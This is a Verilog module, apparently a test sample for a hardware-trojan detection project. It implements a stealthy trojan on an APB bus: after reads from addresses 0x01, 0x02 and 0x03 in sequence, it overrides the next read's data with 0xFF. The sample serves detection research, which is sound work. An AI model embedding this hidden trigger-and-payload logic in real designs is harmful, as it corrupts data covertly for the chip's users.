// =============================================================================
// Module  : stealth_trojan_c
// Project : AI-Assisted Stealth Hardware Trojan Detection
// Purpose : Variant C - Sequential address history trigger
// =============================================================================

module stealth_trojan_c (
    input  wire        PCLK,
    input  wire        PRESETn,
    input  wire [7:0]  PADDR,
    input  wire [7:0]  PWDATA,
    input  wire        PWRITE,
    input  wire        PENABLE,
    input  wire [8:0]  cycle_count,
    input  wire [7:0]  normal_prdata,
    output reg  [7:0]  trojan_prdata,
    output reg         trojan_active
);

    localparam [7:0] TROJAN_PAYLOAD_C = 8'hFF;
    reg [7:0] addr_hist [0:2];

    always @(posedge PCLK) begin
        if (!PRESETn) begin
            addr_hist[0] <= 8'hFF;
            addr_hist[1] <= 8'hFF;
            addr_hist[2] <= 8'hFF;
        end else if (PENABLE && !PWRITE) begin
            addr_hist[2] <= addr_hist[1];
            addr_hist[1] <= addr_hist[0];
            addr_hist[0] <= PADDR;
        end
    end

    wire trigger_fire_c = (addr_hist[0] == 8'h03) &&
                          (addr_hist[1] == 8'h02) &&
                          (addr_hist[2] == 8'h01) &&
                          PENABLE && !PWRITE;

    reg trojan_armed;

    always @(posedge PCLK) begin
        if (!PRESETn) begin
            trojan_armed  <= 1'b0;
            trojan_active <= 1'b0;
        end else begin
            if (trigger_fire_c) begin
                trojan_armed  <= 1'b1;
                trojan_active <= 1'b0;
            end else if (trojan_armed && PENABLE && !PWRITE) begin
                trojan_active <= 1'b1;
                trojan_armed  <= 1'b0;
            end else begin
                trojan_active <= 1'b0;
            end
        end
    end

    always @(*) begin
        if (trojan_active)
            trojan_prdata = TROJAN_PAYLOAD_C;
        else
            trojan_prdata = normal_prdata;
    end

endmodule
